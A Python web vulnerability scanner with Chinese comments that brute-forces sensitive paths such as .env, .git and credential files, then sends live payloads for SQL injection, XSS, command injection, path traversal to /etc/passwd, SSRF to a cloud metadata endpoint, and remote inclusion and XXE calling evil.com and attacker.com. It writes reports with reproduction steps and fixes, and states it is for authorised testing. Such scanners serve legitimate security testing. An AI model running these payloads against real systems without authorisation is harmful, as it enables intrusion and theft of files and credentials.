import requests
import concurrent.futures
import time
import os
import sys
import re
import json
import zipfile
import random
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from datetime import datetime

# 配置参数
CONFIG = {
    "max_threads": 20,  # 最大并发线程数
    "timeout": 10,      # 请求超时时间
    "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36"
    ],
    "common_params": ["id", "user", "name", "page", "view", "file", "search", "query", "cmd"],
    "output_dir": "scan_results"
}

# 常见敏感路径和文件
SENSITIVE_PATHS = [
    # 配置文件
    ".env", "config.php", "configuration.yml", "web.config", 
    "settings.py", "config.json", ".htaccess", "robots.txt",
    
    # 备份文件
    "backup.zip", "database.bak", "site.bak", "wwwroot.rar",
    
    # 敏感目录
    "admin/", "wp-admin/", "manager/", "console/", "api/", 
    "internal/", "secure/", "private/", "logs/",
    
    # 数据库相关
    "phpmyadmin/", "adminer.php", "dbadmin/", "mysql/",
    
    # 开发文件
    ".git/", ".svn/", ".DS_Store", "package.json", "composer.lock",
    
    # 其他
    "LICENSE", "README.md", "CHANGELOG.txt", "error_log"
]

# 全面的漏洞检测规则
VULNERABILITY_CHECKS = {
    "SQL注入": {
        "payloads": [
            "'", "\"", "')", "\")", "';--", "\";--", 
            "' OR '1'='1", "' OR 1=1--", "\" OR \"\"=\"", 
            "' UNION SELECT null,version()--", 
            "' AND 1=convert(int,(SELECT @@version))--"
        ],
        "patterns": [
            r"SQL syntax.*MySQL", r"Warning.*mysql", 
            r"unclosed quotation mark", r"syntax error",
            r"Microsoft SQL Server", r"PostgreSQL", 
            r"SQLite", r"ORA-[0-9]{5}"
        ],
        "methods": ["GET", "POST"],
        "reproduce": "使用工具如SQLMap验证或手动发送恶意SQL语句"
    },
    "跨站脚本(XSS)": {
        "payloads": [
            "<script>alert(1)</script>", 
            "\"><script>alert(1)</script>", 
            "<img src=x onerror=alert(1)>", 
            "javascript:alert(1)", 
            "\" onmouseover=alert(1)//"
        ],
        "patterns": [
            r"<script>alert\(1\)</script>", 
            r"<img src=x onerror=alert\(1\)>",
            r"javascript:alert\(1\)"
        ],
        "methods": ["GET", "POST"],
        "reproduce": "在浏览器中直接访问构造的URL"
    },
    "路径遍历": {
        "payloads": [
            "../../../../etc/passwd", 
            "....//....//etc/passwd",
            "%2e%2e%2fetc%2fpasswd",
            "..%5c..%5cwindows%5cwin.ini"
        ],
        "patterns": [
            r"root:.*:0:0:", r"bin:.*:1:1:",
            r"\[(fonts|extensions)\]"
        ],
        "methods": ["GET"],
        "reproduce": "在浏览器中访问包含恶意路径的URL"
    },
    "命令注入": {
        "payloads": [
            ";id", "|id", "&&id", "`id`", 
            "$(id)", "||id", "id%00", 
            "id'", "id\"", "id`"
        ],
        "patterns": [
            r"uid=\d+\([^)]+\)", r"gid=\d+\([^)]+\)",
            r"Microsoft Windows \[Version"
        ],
        "methods": ["GET"],
        "reproduce": "发送包含系统命令的请求并检查响应"
    },
    "文件包含": {
        "payloads": [
            "?file=../../../../etc/passwd",
            "?page=php://filter/convert.base64-encode/resource=index.php",
            "?include=http://evil.com/shell.php"
        ],
        "patterns": [
            r"root:.*:0:0:", r"<\?php", r"base64 encoded content",
            r"evil\.com"
        ],
        "methods": ["GET"],
        "reproduce": "访问包含恶意文件路径的URL"
    },
    "开放重定向": {
        "payloads": [
            "?redirect=https://evil.com",
            "?url=//evil.com",
            "?next=javascript:alert(1)"
        ],
        "patterns": [
            r"Location:.*(evil.com|javascript:)"
        ],
        "methods": ["GET"],
        "reproduce": "点击包含恶意重定向参数的链接"
    },
    "服务器端请求伪造(SSRF)": {
        "payloads": [
            "?url=http://169.254.169.254/latest/meta-data/",
            "?image=http://localhost:22",
            "?server=file:///etc/passwd"
        ],
        "patterns": [
            r"AMAZON_META_DATA", r"root:.*:0:0:", 
            r"SSH", r"EC2"
        ],
        "methods": ["GET"],
        "reproduce": "发送包含内部URL的请求并检查响应"
    },
    "XML外部实体注入(XXE)": {
        "payloads": [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/xxe">%remote;]>'
        ],
        "patterns": [
            r"root:.*:0:0:", r"ENTITY"
        ],
        "methods": ["POST"],
        "headers": {"Content-Type": "application/xml"},
        "reproduce": "使用Burp Suite或Postman发送恶意XML数据"
    },
    "服务器端模板注入(SSTI)": {
        "payloads": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "${{<%[%'\"}}%\\"
        ],
        "patterns": [
            r"49", r"343", r"14"
        ],
        "methods": ["GET", "POST"],
        "reproduce": "在输入字段提交模板表达式并检查输出"
    },
    "不安全的反序列化": {
        "payloads": [
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSSTbXKlc3YVf6DAAAeHBzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXVxAH4AAgAAAAN1cQB+AAIAAAACdAAFaW5qZWN0dAAEY29kZXg="
        ],
        "patterns": [
            r"java\.", r"serialization", r"deserialization"
        ],
        "methods": ["POST"],
        "headers": {"Content-Type": "application/java-serialized-object"},
        "reproduce": "发送恶意序列化数据并监控系统行为"
    },
    "文件上传漏洞": {
        "payloads": [
            "test"
        ],
        "patterns": [
            r"upload successful", r"file saved"
        ],
        "methods": ["POST"],
        "files": {"file": ("test.php", "<?php phpinfo(); ?>", "application/x-php")},
        "reproduce": "尝试上传恶意文件并访问上传路径"
    },
    "LDAP注入": {
        "payloads": [
            "*)(uid=*))(|(uid=*",
            "*))%00"
        ],
        "patterns": [
            r"ldap_.*error", r"invalid filter", r"search result"
        ],
        "methods": ["GET", "POST"],
        "reproduce": "在LDAP查询字段提交恶意输入"
    },
    "XPath注入": {
        "payloads": [
            "' or '1'='1",
            "' or position()=last()"
        ],
        "patterns": [
            r"XPath.*error", r"invalid expression"
        ],
        "methods": ["GET", "POST"],
        "reproduce": "在XPath查询字段提交恶意输入"
    },
    "HTTP头注入": {
        "payloads": [
            "test\r\nX-Forwarded-For: 127.0.0.1",
            "test\r\nSet-Cookie: malicious=true"
        ],
        "patterns": [
            r"X-Forwarded-For: 127\.0\.0\.1", 
            r"Set-Cookie: malicious=true"
        ],
        "methods": ["GET"],
        "headers": True,
        "reproduce": "使用Burp Suite修改请求头并发送"
    },
    "身份验证绕过": {
        "payloads": [
            "?admin=true",
            "?role=administrator"
        ],
        "patterns": [
            r"admin panel", r"welcome administrator"
        ],
        "methods": ["GET"],
        "reproduce": "使用特殊参数访问受限页面"
    },
    "敏感数据暴露": {
        "payloads": [
            "?debug=true"
        ],
        "patterns": [
            r"password", r"api_key", r"secret", 
            r"database", r"credentials"
        ],
        "methods": ["GET", "POST"],
        "reproduce": "访问调试接口或包含敏感信息的URL"
    }
}

class SecurityScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": random.choice(CONFIG["user_agents"]),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })
        self.found_paths = []
        self.vulnerabilities = []
        self.start_time = time.time()
        
        # 创建输出目录
        if not os.path.exists(CONFIG["output_dir"]):
            os.makedirs(CONFIG["output_dir"])
    
    def load_wordlist(self):
        """加载内置常见路径字典"""
        return SENSITIVE_PATHS + [
            f"{self.target_url.split('//')[-1].split('/')[0]}.zip",
            f"{self.target_url.split('//')[-1].split('/')[0]}.sql",
            "backup.tar.gz",
            "dump.sql",
            "config.ini",
            "credentials.txt",
            "secret.key",
            "oauth.json",
            "v1/api/users",
            "graphql",
            "swagger.json",
            "actuator/health",
            "wp-json/wp/v2/users",
            "api/v1/users",
            "admin/login.php",
            "debug.php",
            "phpinfo.php"
        ]
    
    def test_path(self, path):
        """测试单个路径"""
        try:
            url = urljoin(self.target_url + '/', path)
            response = self.session.get(url, timeout=CONFIG["timeout"], allow_redirects=False)
            
            # 检查响应状态
            if response.status_code < 400:
                self.found_paths.append({
                    "url": url,
                    "status": response.status_code,
                    "length": len(response.content),
                    "redirect": response.headers.get("Location", ""),
                    "content_type": response.headers.get("Content-Type", "")
                })
                return True
            
            # 检查重定向
            if 300 <= response.status_code < 400:
                location = response.headers.get("Location", "")
                if location.startswith('/'):
                    location = urljoin(self.target_url, location)
                
                self.found_paths.append({
                    "url": url,
                    "status": response.status_code,
                    "redirect": location,
                    "length": len(response.content),
                    "content_type": response.headers.get("Content-Type", "")
                })
            
            return False
        except Exception as e:
            return False
    
    def scan_paths(self):
        """扫描所有路径"""
        wordlist = self.load_wordlist()
        print(f"[*] 开始路径扫描，目标: {self.target_url}")
        print(f"[*] 加载了 {len(wordlist)} 个路径进行测试")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=CONFIG["max_threads"]) as executor:
            futures = {executor.submit(self.test_path, path): path for path in wordlist}
            
            for i, future in enumerate(concurrent.futures.as_completed(futures)):
                path = futures[future]
                if future.result():
                    print(f"[+] 发现有效路径: {path}")
                if (i + 1) % 100 == 0:
                    print(f"[*] 已测试 {i+1}/{len(wordlist)} 个路径...")
        
        print(f"[*] 路径扫描完成，发现 {len(self.found_paths)} 个有效路径")
        return len(self.found_paths)
    
    def test_vulnerability(self, url, vuln_type, payload, method="GET"):
        """测试单个漏洞"""
        try:
            vuln_data = VULNERABILITY_CHECKS[vuln_type]
            
            # 准备请求参数
            headers = self.session.headers.copy()
            if "headers" in vuln_data:
                headers.update(vuln_data["headers"])
            
            data = None
            files = None
            params = {}
            
            # 处理不同类型的漏洞
            if vuln_type == "HTTP头注入":
                # 特殊处理头注入
                headers["User-Agent"] = payload
                response = self.session.get(url, headers=headers, timeout=CONFIG["timeout"])
                content = response.text
            elif "files" in vuln_data:
                # 处理文件上传
                files = vuln_data["files"]
                response = self.session.post(url, files=files, timeout=CONFIG["timeout"])
                content = response.text
            else:
                # 处理其他类型
                parsed = urlparse(url)
                query_params = parse_qs(parsed.query)
                
                # 准备测试参数
                for param in query_params:
                    params[param] = payload
                    
                # 如果没有参数，使用常见参数
                if not query_params and CONFIG["common_params"]:
                    for common_param in CONFIG["common_params"]:
                        params[common_param] = payload
                
                # 构建测试URL
                test_url = parsed._replace(query=urlencode(params, doseq=True)).geturl()
                
                # 发送请求
                if method == "GET":
                    response = self.session.get(test_url, headers=headers, timeout=CONFIG["timeout"])
                else:  # POST
                    if vuln_type == "XML外部实体注入(XXE)":
                        data = payload
                    else:
                        data = params
                    response = self.session.post(test_url, data=data, headers=headers, timeout=CONFIG["timeout"])
                
                content = response.text
            
            # 检查响应
            for pattern in vuln_data["patterns"]:
                if re.search(pattern, content, re.IGNORECASE):
                    return {
                        "url": url,
                        "type": vuln_type,
                        "payload": payload,
                        "method": method,
                        "status": response.status_code,
                        "reproduce": vuln_data.get("reproduce", "请参考漏洞类型通用复现方法")
                    }
        except Exception as e:
            return None
        return None
    
    def test_path_vulnerabilities(self, path_entry):
        """对单个路径进行所有漏洞检测"""
        url = path_entry["url"]
        vulnerabilities_found = []
        
        for vuln_type, vuln_data in VULNERABILITY_CHECKS.items():
            for payload in vuln_data["payloads"]:
                for method in vuln_data["methods"]:
                    result = self.test_vulnerability(url, vuln_type, payload, method)
                    if result:
                        vulnerabilities_found.append(result)
                        print(f"[!] 发现漏洞: {vuln_type} @ {url} (方法: {method})")
        
        return vulnerabilities_found
    
    def detect_vulnerabilities(self):
        """对所有发现的路径进行漏洞检测"""
        if not self.found_paths:
            print("[!] 未发现有效路径，跳过漏洞检测")
            return
        
        print(f"[*] 开始漏洞检测，共 {len(self.found_paths)} 个路径需要测试...")
        total_tests = len(self.found_paths) * sum(len(v["payloads"]) for v in VULNERABILITY_CHECKS.values())
        print(f"[*] 预计执行 {total_tests} 个测试用例")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=CONFIG["max_threads"]) as executor:
            futures = {executor.submit(self.test_path_vulnerabilities, path): path for path in self.found_paths}
            
            for i, future in enumerate(concurrent.futures.as_completed(futures)):
                path = futures[future]
                vulns = future.result()
                if vulns:
                    self.vulnerabilities.extend(vulns)
                
                if (i + 1) % 10 == 0:
                    print(f"[*] 已测试 {i+1}/{len(self.found_paths)} 个路径，发现 {len(self.vulnerabilities)} 个漏洞...")
        
        print(f"[*] 漏洞检测完成，发现 {len(self.vulnerabilities)} 个潜在漏洞")
    
    def generate_txt_report(self):
        """生成包含复现指南的TXT格式扫描报告"""
        # 生成文件名
        domain = urlparse(self.target_url).netloc.replace(':', '_')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_filename = f"{domain}_{timestamp}_report.txt"
        report_path = os.path.join(CONFIG["output_dir"], report_filename)
        
        # 生成报告内容
        report_content = f"""网站安全扫描报告
============================

目标网站: {self.target_url}
扫描时间: {datetime.fromtimestamp(self.start_time).strftime('%Y-%m-%d %H:%M:%S')}
扫描时长: {time.time() - self.start_time:.2f} 秒
测试路径数: {len(self.load_wordlist())}
有效路径数: {len(self.found_paths)}
发现漏洞数: {len(self.vulnerabilities)}

============================
漏洞详情:
"""

        # 添加漏洞详情和复现指南
        if self.vulnerabilities:
            for i, vuln in enumerate(self.vulnerabilities, 1):
                report_content += f"""
漏洞 #{i}
----------
漏洞类型: {vuln['type']}
URL地址: {vuln['url']}
HTTP方法: {vuln['method']}
利用载荷: {vuln['payload']}
HTTP状态码: {vuln['status']}

复现步骤:
1. 使用工具(如Burp Suite、Postman或curl)准备请求
2. 设置HTTP方法为: {vuln['method']}
3. 设置目标URL为: {vuln['url']}
4. 设置请求参数或载荷为: {vuln['payload']}
5. 发送请求并观察响应
6. {vuln['reproduce']}

修复建议:
{self.get_fix_suggestion(vuln['type'])}
"""
        else:
            report_content += "\n未发现安全漏洞\n"
        
        # 添加有效路径列表
        report_content += f"""
============================
有效路径列表:
"""
        for path in self.found_paths:
            report_content += f"- {path['url']} (状态码: {path['status']})\n"
        
        # 添加通用修复指南
        report_content += """
============================
通用安全建议:
1. 保持所有软件和库的最新版本
2. 对所有用户输入进行严格验证和过滤
3. 使用参数化查询防止SQL注入
4. 实施内容安全策略(CSP)防止XSS
5. 限制文件上传类型和大小
6. 禁用不必要的HTTP方法
7. 配置安全的CORS策略
8. 使用Web应用防火墙(WAF)
9. 定期进行安全扫描和渗透测试
10. 实施最小权限原则
"""
        
        # 保存报告
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(report_content)
        
        print(f"[*] TXT扫描报告已保存至: {report_path}")
        return report_path
    
    def get_fix_suggestion(self, vuln_type):
        """获取漏洞修复建议"""
        suggestions = {
            "SQL注入": "使用参数化查询或ORM框架，避免拼接SQL语句",
            "跨站脚本(XSS)": "对所有输出进行HTML编码，实施内容安全策略(CSP)",
            "路径遍历": "规范化文件路径，禁止使用'..'等特殊字符",
            "命令注入": "避免使用系统命令，使用安全的API替代",
            "文件包含": "禁用远程文件包含，限制包含文件路径",
            "开放重定向": "验证重定向URL，禁止重定向到外部域名",
            "服务器端请求伪造(SSRF)": "过滤用户提供的URL，禁止访问内部资源",
            "XML外部实体注入(XXE)": "禁用外部实体解析，使用JSON替代XML",
            "服务器端模板注入(SSTI)": "使用沙盒环境执行模板，避免用户控制模板",
            "不安全的反序列化": "避免反序列化用户输入，使用JSON等安全格式",
            "文件上传漏洞": "验证文件类型和内容，限制上传目录执行权限",
            "LDAP注入": "使用参数化LDAP查询，过滤特殊字符",
            "XPath注入": "使用参数化XPath查询，避免拼接查询语句",
            "HTTP头注入": "验证和过滤所有HTTP头值",
            "身份验证绕过": "实施强身份验证机制，使用多因素认证",
            "敏感数据暴露": "禁用调试接口，保护敏感信息"
        }
        
        return suggestions.get(vuln_type, "请参考OWASP相关指南进行修复")
    
    def zip_results(self, report_path):
        """打包扫描结果为ZIP文件"""
        zip_filename = f"{os.path.basename(report_path).replace('.txt', '')}.zip"
        zip_path = os.path.join(CONFIG["output_dir"], zip_filename)
        
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            zipf.write(report_path, os.path.basename(report_path))
        
        print(f"[*] 结果已打包为ZIP文件: {zip_path}")
        return zip_path

def main():
    print("""
    ███████╗ ██████╗███████╗ █████╗ ██████╗ ██╗████████╗██╗   ██╗
    ██╔════╝██╔════╝██╔════╝██╔══██╗██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
    █████╗  ██║     █████╗  ███████║██████╔╝██║   ██║    ╚████╔╝ 
    ██╔══╝  ██║     ██╔══╝  ██╔══██║██╔═══╝ ██║   ██║     ╚██╔╝  
    ██║     ╚██████╗███████╗██║  ██║██║     ██║   ██║      ██║   
    ╚═╝      ╚═════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝      ╚═╝   
    作者:火龙果小泽先生
    """)
    
    if len(sys.argv) < 2:
        print(f"使用方法: python {sys.argv[0]} <目标URL>")
        print("示例: python full_scanner.py https://example.com")
        sys.exit(1)
    
    target_url = sys.argv[1]
    scanner = SecurityScanner(target_url)
    
    try:
        # 执行扫描
        paths_found = scanner.scan_paths()
        
        if paths_found > 0:
            scanner.detect_vulnerabilities()
        
        # 生成报告和ZIP
        report_path = scanner.generate_txt_report()
        zip_path = scanner.zip_results(report_path)
        
        print(f"\n[+] 扫描完成! 结果已保存至: {zip_path}")
        print(f"[*] 扫描统计: ")
        print(f"    - 测试路径: {len(scanner.load_wordlist())}")
        print(f"    - 有效路径: {len(scanner.found_paths)}")
        print(f"    - 发现漏洞: {len(scanner.vulnerabilities)}")
        print("[!] 重要提示: 本工具仅用于授权测试，使用前请确保您有合法权限")
        
    except KeyboardInterrupt:
        print("\n[!] 扫描被用户中断")
        sys.exit(1)
    except Exception as e:
        print(f"[!] 发生错误: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
